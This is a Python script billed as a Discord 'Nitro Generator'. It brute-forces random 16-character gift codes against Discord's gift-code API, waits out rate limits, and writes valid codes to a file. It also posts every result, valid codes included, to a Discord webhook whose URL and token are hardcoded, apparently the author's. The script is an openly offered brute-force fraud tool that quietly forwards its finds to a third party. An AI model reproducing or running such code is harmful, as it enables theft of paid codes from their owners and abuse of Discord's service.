import random, string
import time
import requests
from colorama import init, Fore
from dhooks import Webhook, Embed

hook = Webhook(
    "https://discord.com/api/webhooks/806829014361833482/aXrdUPwX9gc3mXE88sRpC_nCz6Z13eu3kr9OlHh6hRsEug1QXIB108tARJSdL7tMY6p1")
def send_webhook_nitro(finish, code):
    if finish:
        embed = Embed(
            color=int("77b255", 16),
            timestamp='now'  # sets the timestamp to current time
        )
    else:
        embed = Embed(
            colour=0xe00000,
            timestamp='now'  # sets the timestamp to current time
        )
    imgdb = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSuY0VG8lVywNX8u4737PozHkm7XLAYWBmqnA&usqp=CAU'

    embed.set_author(name='Nitro Generator', icon_url=imgdb)
    embed.add_field(name='Job :', value='`generating and checking nitro codes` ', inline=True)
    embed.add_field(name='status :', value=f"{'`invalid`' if not finish else '`valid`'}", inline=True)
    embed.add_field(name='Code :', value=f"{'`None`' if not finish else f'`{code}`'}", inline=True)
    embed.set_footer(text='Powered By gabutcodex.tk')

    embed.set_thumbnail(imgdb)
    # embed.set_image(image2)

    hook.send(embed=embed)

init(autoreset=True)
print(f"{Fore.BLUE}Creator  - Pooria#2177 ")
time.sleep(0.3)
f = open("NitroCodes.txt", "w", encoding='utf-8')
length = 1000
print("Wait, Generating for you!")
nitroList = []
for n in range(length):
    code = ""
    for i in range(16):
        code = f"{code}{random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase)}"
    nitroList.append(code)
print("Codes Generated, Now time for checking!")
# =============Checker=========================

for line in nitroList:
    url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{line}?with_application=false&with_subscription_plan=true"
    r = requests.get(url)
    if r.json()['message'] == 'You are being rate limited.':
        # print(f'You are being rate limited, Please wait ' + str(r.json()['retry_after'] / 1000) + ' seconds')
        time.sleep(r.json()['retry_after'] / 1000)
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{line}?with_application=false&with_subscription_plan=true"
        r = requests.get(url)
    if r.status_code == 200:
        send_webhook_nitro(True, f"https://discord.gift/{line}")
        f.write(f"https://discord.gift/{line}")
    else:
        send_webhook_nitro(False,"None")


embed = Embed(
        color=int("77b255", 16),
        timestamp='now'  # sets the timestamp to current time
    )
imgdb = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSuY0VG8lVywNX8u4737PozHkm7XLAYWBmqnA&usqp=CAU'

embed.set_author(name='Nitro Generator', icon_url=imgdb)
embed.add_field(name='Job :', value='`finished checking nitro codes` ', inline=True)
embed.add_field(name='status :', value=f"{'`finished`'}", inline=True)
embed.set_footer(text='Powered By gabutcodex.tk')

embed.set_thumbnail(imgdb)
# embed.set_image(image2)

hook.send(embed=embed)


